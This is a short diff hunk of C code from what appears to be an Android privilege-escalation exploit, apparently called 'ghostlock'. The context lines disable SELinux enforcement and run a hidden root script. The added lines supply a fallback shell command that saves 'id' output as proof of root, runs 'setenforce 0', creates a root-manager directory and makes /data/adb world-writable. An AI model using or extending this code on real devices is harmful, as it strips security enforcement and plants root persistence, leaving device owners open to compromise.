@@ -1715,6 +1715,11 @@ static void child_main(struct child_pipes *p) {
     int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
     if (efd >= 0) { write(efd, "0", 1); close(efd); }
     execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
+    /* fallback if the script is missing: minimal durable proof */
+    execl("/system/bin/sh", "sh", "-c",
+          "id > /data/local/tmp/ROOTED_ID.txt 2>&1; "
+          "setenforce 0; mkdir -p /data/adb/ksu; chmod 777 /data/adb",
+          (char *)NULL);
     _exit(1);
   }
   if (gc > 0) waitpid(gc, NULL, 0);
